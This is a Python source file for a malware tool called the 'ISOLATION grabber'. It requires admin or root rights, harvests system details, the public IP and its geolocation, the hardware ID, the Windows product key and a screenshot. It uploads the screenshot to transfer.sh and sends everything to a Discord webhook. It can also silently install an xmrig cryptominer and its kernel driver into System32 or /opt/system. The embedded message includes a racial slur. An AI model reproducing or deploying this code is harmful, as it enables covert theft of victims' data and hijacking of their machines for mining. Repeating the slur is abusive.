import ctypes, sys, platform
if platform.system() == "Windows":
    import ctypes
    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    if is_admin():
        pass
    else:
        sys.exit("Rerun with Administrator priv.")
else:
    def has_sudo():
        return os.geteuid() == 0
    if has_sudo():
        pass
    else:
        sys.exit("Rerun with Sudo or Root")
import os
import grabber_utils.cosita_toolkit as ctkit
import discord_webhook
import json
import platform
import socket
import subprocess
import requests
from urllib.request import urlopen
import psutil
import shutil
from PIL import ImageGrab
# pre-run needed variables
os.chdir(os.path.dirname(os.path.abspath(__file__)))
config_file = open("./CONFIG.json","r")
config = json.load(config_file)

hostname=socket.gethostname()
localIPAddr=socket.gethostbyname(hostname)
IPAddr = requests.get("https://checkip.amazonaws.com")
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

if platform.system()=="Windows":
    hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
else:
    hwid = subprocess.check_output(['cat', '/etc/machine-id'])

pcname = os.path.expanduser("~")

data_link = f"https://ipinfo.io/{IPAddr.text[:-2]}/json"
respons = urlopen(data_link)
data = json.load(respons)
def extract_files(file_names,destination_dir):
    # Determine the path to the directory containing the executable
    if getattr(sys, 'frozen', False):  # If running as a bundled executable
        exe_path = sys.executable
        exe_dir = os.path.dirname(exe_path)
    else:  # If running as a script
        exe_dir = os.path.dirname(__file__)


    # Extract each file to the destination directory
    for file_name in file_names:
        source_path = os.path.join(exe_dir, file_name)
        destination_path = os.path.join(destination_dir, file_name)

        try:
            shutil.copy(source_path, destination_path)
        except Exception as e:
            sys.exit(f"ERROR: {e}")
# Miner deploy
if config["MINER"] == True:
    if platform.system() == "Windows":
        extract_files(["WinRing0x64.sys","xmrig.exe"], "C://Windows/System32")
    else:
        os.mkdir("/opt/system/")
        extract_files(["xmrig"], "/opt/system/")

# webhook
embedcont = f'''
---------------------
get grabbed nigga
---------------------
Operating system >> {platform.system()}
Architecture --- >> {platform.machine()}
OS.name -------- >> {os.name}
HostName ------- >> {hostname}
pc name -------- >> {pcname}
Proccessor ----- >> {platform.processor()}
RAM ------------ >> {str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"}
local Ip Address >> {localIPAddr}
Ip Address ----- >> {IPAddr.text}HWID ---------- >> {hwid}
ORG ------------ >> {data["org"]}
ORG hostname --- >> {data["hostname"]}
City ----------- >> {data["city"]}
Region --------- >> {data["region"]}
Country -------- >> {data["country"]}
Location ------- >> {data["loc"]}
Postal --------- >> {data["postal"]}

-----WINDOWS ONLY----
Key ------------ >> {ctkit.OSspecific.Windows.get_windows_product_key()}

------LINUX ONLY-----
Distribution: {ctkit.OSspecific.Linux.get_linux_distro()}

'''

screenshot = ImageGrab.grab()
screenshot.save("screenshot.png")
screenshot_url = ctkit.upload_to_transfer_sh("screenshot.png")
def main():
    webhook = discord_webhook.DiscordWebhook(url=str(config["WEBHOOK"]),rate_limit_retry= True)
    embed = discord_webhook.DiscordEmbed(title="ISOLATION",description=embedcont, color="23272A")
    embed.set_timestamp()
    embed.set_footer(text="Grabbed w/ ISOLATION grabber")
    embed.set_thumbnail("https://media.discordapp.net/attachments/1136359120233046057/1142457082243711007/1e35053d0cd075d470bd6a80a2a9a1c1.png?width=449&height=449")
    embed.set_image(screenshot_url)
    webhook.add_embed(embed=embed)
    webhook.execute()
if __name__== "__main__":
    main()